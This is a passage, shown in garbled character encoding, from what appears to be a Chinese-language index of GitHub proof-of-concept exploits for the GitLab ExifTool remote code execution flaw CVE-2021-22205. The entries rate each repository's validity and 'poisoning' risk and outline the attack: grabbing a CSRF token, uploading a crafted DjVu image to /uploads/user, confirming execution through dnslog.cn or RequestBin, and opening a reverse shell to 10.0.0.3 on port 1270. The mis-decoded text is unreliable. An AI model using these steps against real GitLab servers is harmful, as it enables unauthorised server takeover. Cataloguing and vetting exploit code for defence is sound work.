**åˆ©ç”¨æ–¹å¼ï¼š**
æ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„å‘½ä»¤çš„Exifå…ƒæ•°æ®çš„å›¾ç‰‡æ–‡ä»¶ï¼‰åˆ°GitLabæœåŠ¡å™¨ã€‚GitLabä½¿ç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œå›¾ç‰‡ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ã€‚
2.  å°†è¯¥å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°GitLabæœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®logoä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLabæœåŠ¡å™¨è°ƒç”¨ExifToolè§£æžè¯¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  æ”»å‡»è€…é€šè¿‡æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [hh-hunter/cve-2021-22205](https://github.com/hh-hunter/cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #13

**æ¥æº**: [CVE-2021-22205-hhhotdrink_CVE-2021-22205.md](../2021/CVE-2021-22205-hhhotdrink_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦ä½äºŽå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼‰æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žæ˜¯æœ‰æ•ˆçš„ï¼Œå¹¶ä¸”å·²è¢«å…¬å¼€åˆ©ç”¨ã€‚CISA å·²å°†å…¶æ·»åŠ åˆ°å·²çŸ¥è¢«åˆ©ç”¨çš„æ¼æ´žç›®å½•ä¸­ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„ Python è„šæœ¬ `22205exp.py` åŒ…å«æ¼æ´žéªŒè¯å’Œåˆ©ç”¨ä»£ç ã€‚ è¯¥è„šæœ¬åˆ©ç”¨ `dnslog.cn` æ¥éªŒè¯å‘½ä»¤æ‰§è¡Œã€‚ è™½ç„¶ `dnslog.cn` æ˜¯ä¸€ç§å¸¸è§çš„æ¼æ´žéªŒè¯æ–¹æ³•ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶ `dnslog.cn`ï¼Œåˆ™å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œä»–ä»¬å¯ä»¥è®°å½•æ¼æ´žåˆ©ç”¨ä¿¡æ¯ã€‚ åŒæ—¶ï¼Œè„šæœ¬ä¸­ä½¿ç”¨äº†ç¡¬ç¼–ç çš„User-Agentå’ŒContent-Typeï¼Œè¿™å¢žåŠ äº†è„šæœ¬è¢«è¯†åˆ«å’Œé˜²å¾¡çš„å¯èƒ½æ€§ã€‚å¦‚æžœæ”»å‡»è€…ä¿®æ”¹è¿™äº›å‚æ•°ï¼Œå¯èƒ½ä¼šå¢žåŠ æ”»å‡»çš„æˆåŠŸçŽ‡ï¼Œä½†ä¹Ÿå¯èƒ½è¢«è§†ä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºã€‚ æ­¤å¤–ï¼Œè¯¥è„šæœ¬ä¾èµ–äºŽ `beautifulsoup4` å’Œ `requests` åº“ã€‚ å¦‚æžœè¿™äº›åº“è¢«æ¶æ„ç¯¡æ”¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´æŠ•æ¯’ã€‚ ç»¼åˆæ¥çœ‹ï¼Œè„šæœ¬æœ¬èº«åŒ…å«ç›´æŽ¥çš„åŽé—¨ä»£ç çš„å¯èƒ½æ€§è¾ƒä½Žï¼Œä½†é—´æŽ¥æŠ•æ¯’é£Žé™©ï¼ˆå¦‚ä¾èµ–åº“æˆ–éªŒè¯å¹³å°è¢«æŽ§åˆ¶ï¼‰ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©å¤§çº¦ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å– CSRF Tokenï¼š** è„šæœ¬é¦–å…ˆè®¿é—® `/users/sign_in` é¡µé¢ï¼Œä½¿ç”¨ `BeautifulSoup` è§£æž HTMLï¼Œæå– CSRF tokenã€‚
2.  **æž„é€ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å‘½ä»¤çš„ DJVU æ ¼å¼å›¾åƒæ–‡ä»¶ã€‚è¯¥å‘½ä»¤é€šå¸¸ç”¨äºŽæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œä¾‹å¦‚é€šè¿‡ `curl` å°†æœåŠ¡å™¨ä¿¡æ¯å‘é€åˆ°æ”»å‡»è€…çš„ DNS æœåŠ¡å™¨ã€‚
3.  **ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬ä½¿ç”¨åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶å’Œ CSRF token çš„ `multipart/form-data` è¯·æ±‚ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` ç«¯ç‚¹ã€‚
4.  **è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š** GitLab å°è¯•ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒï¼Œç”±äºŽæ–‡ä»¶å†…å®¹æ²¡æœ‰ç»è¿‡å……åˆ†éªŒè¯ï¼Œå¯¼è‡´ ExifTool æ‰§è¡ŒåµŒå…¥åœ¨å›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ã€‚
5.  **éªŒè¯æ¼æ´žï¼š** è„šæœ¬é€šè¿‡æŸ¥è¯¢ `dnslog.cn` æ¥ç¡®è®¤å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥æ¼æ´žåˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä½†éœ€è¦æ³¨æ„æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [hhhotdrink/CVE-2021-22205](https://github.com/hhhotdrink/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #14

**æ¥æº**: [CVE-2021-22205-honypot_CVE-2021-22205.md](../2021/CVE-2021-22205-honypot_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æœªç»èº«ä»½éªŒè¯çš„ç½‘ç»œè®¿é—®ï¼Œä»¥åŠç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 20%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨Docker Composeéƒ¨ç½²äº†ä¸€ä¸ªåŒ…å«æ¼æ´žçš„GitLab EE 13.9.5å®žä¾‹ï¼Œè¡¨æ˜Žè¯¥POCæ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥å¤çŽ°è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
å°½ç®¡å¤§éƒ¨åˆ†ä»£ç çœ‹èµ·æ¥æ˜¯ä¸ºäº†å¤çŽ°æ¼æ´žï¼Œä½†ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£Žé™©ã€‚
*   `gitlab/entry.sh`è„šæœ¬æ·»åŠ äº†ä¸€ä¸ªåä¸º`eth1`çš„è™šæ‹Ÿç½‘ç»œæŽ¥å£ï¼Œå¹¶åˆ†é…äº†ä¸€ä¸ªå…¬ç½‘IPåœ°å€ã€‚è¿™æœ¬èº«å¹¶æ²¡æœ‰æ¶æ„ï¼Œä½†å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶äº†GitLabå®žä¾‹ï¼Œåˆ™å¯èƒ½åˆ©ç”¨æ­¤æŽ¥å£è¿›è¡Œéšè”½é€šä¿¡æˆ–æ•°æ®æ³„éœ²ã€‚å¯èƒ½æ€§ä¸º10%ã€‚
* `gitlab/dummy/backup.txt`åŒ…å«äº†ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·åå¯†ç ,å¦‚æžœè¢«åˆ©ç”¨,å­˜åœ¨å®‰å…¨é£Žé™©ã€‚å¯èƒ½æ€§ä¸º10%.

æ€»ä½“çš„æŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º20%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…éœ€è¦æž„å»ºä¸€ä¸ªæ¶æ„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥çš„ExifToolå‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…å°†æ¶æ„å›¾åƒä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„GitLabå®žä¾‹ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®é™„ä»¶ç­‰ï¼‰ã€‚
3.  GitLabå°è¯•å¤„ç†å›¾åƒï¼Œè°ƒç”¨ExifToolã€‚
4.  ExifToolæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [honypot/CVE-2021-22205](https://github.com/honypot/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #15

**æ¥æº**: [CVE-2021-22205-inspiringz_CVE-2021-22205.md](../2021/CVE-2021-22205-inspiringz_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼ŒæœªæŽˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œå¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽGitLabæœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ExifToolå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´žä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åˆ¤æ–­è¯¥POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯è¡¨æ˜Žè¯¥æ¼æ´žå½±å“å¤šä¸ªGitLabç‰ˆæœ¬ï¼Œä¸”CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ã€‚æ¼æ´žåˆ©ç”¨ä»£ç æ—¨åœ¨åˆ©ç”¨ExifToolåœ¨å¤„ç†æ¶æ„å›¾åƒæ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆ©ç”¨CVE-2021-22205æ¼æ´žçš„exploitï¼Œç”¨äºŽè¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…¶ä¸­å®šä¹‰äº†Sessionsç±»ä»¥æ–¹ä¾¿å‘é€HTTPè¯·æ±‚, å¹¶ä¸”ä½¿ç”¨äº†DNSLogï¼ŒPostBinï¼ŒRequestBinç­‰æœåŠ¡ä½œä¸ºéªŒè¯æ¼æ´žçš„æ–¹å¼ã€‚ä»£ç ä¸­`random_str`å‡½æ•°ç”¨äºŽç”Ÿæˆéšæœºå­—ç¬¦ä¸²ï¼Œè¿™åœ¨æ¼æ´žåˆ©ç”¨ä¸­å¾ˆå¸¸è§ï¼Œç”¨äºŽé¿å…è¢«ç®€å•è§„åˆ™æ£€æµ‹ã€‚`/tmp/5c52ea306e0854cb73063a671293313c/CVE-2021-22205.py`è¡¨æ˜Žè¯¥è„šæœ¬ä½äºŽä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œå¯èƒ½è¡¨æ˜Žæ˜¯ä¸€ä¸ªæå–å‡ºæ¥çš„æˆ–è€…ä¸‹è½½çš„åˆ©ç”¨è„šæœ¬ã€‚ä»£ç ä¸­å­˜åœ¨å¯¹ä¸€äº›å¤–éƒ¨æœåŠ¡çš„è°ƒç”¨ï¼Œæ¯”å¦‚DNSLogï¼ŒRequestBinç­‰ï¼Œä½œè€…å¯èƒ½é€šè¿‡è¿™äº›æœåŠ¡æ¥æ”¶é›†ä¸€äº›ä¿¡æ¯ã€‚å› æ­¤ï¼Œå­˜åœ¨ä¸€å®šè¢«æŠ•æ¯’çš„é£Žé™©ï¼Œä¾‹å¦‚ä½œè€…åœ¨è„šæœ¬ä¸­åµŒå…¥æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ç›®æ ‡æœåŠ¡å™¨çš„èµ„æºè¿›è¡ŒæŒ–çŸ¿æˆ–è€…å…¶ä»–æ¶æ„è¡Œä¸ºã€‚æ­¤å¤–ï¼ŒDNSLogå¦‚æžœè¢«æ¶æ„åŠ«æŒï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œå­˜åœ¨10%çš„æŠ•æ¯’å¯èƒ½æ€§ï¼Œè¯·ä»”ç»†å®¡è®¡ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **èŽ·å–CSRF Tokenå’ŒSession Cookieï¼š** æ¼æ´žåˆ©ç”¨çš„ç¬¬ä¸€æ­¥æ˜¯èŽ·å–æœ‰æ•ˆçš„CSRF Tokenå’ŒSession Cookieã€‚POCä»£ç é¦–å…ˆå°è¯•è®¿é—® `/users/sign_in`ã€`/help` æˆ– `/explore` é¡µé¢ï¼Œç„¶åŽä»Žä¸­æå–æ‰€éœ€çš„tokenå’Œcookieã€‚
2.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** åˆ©ç”¨èŽ·å–çš„CSRF Tokenå’ŒSession Cookieï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶çš„Exifå…ƒæ•°æ®ä¸­åŒ…å«æ¶æ„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šç”±ExifToolæ‰§è¡Œã€‚
3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
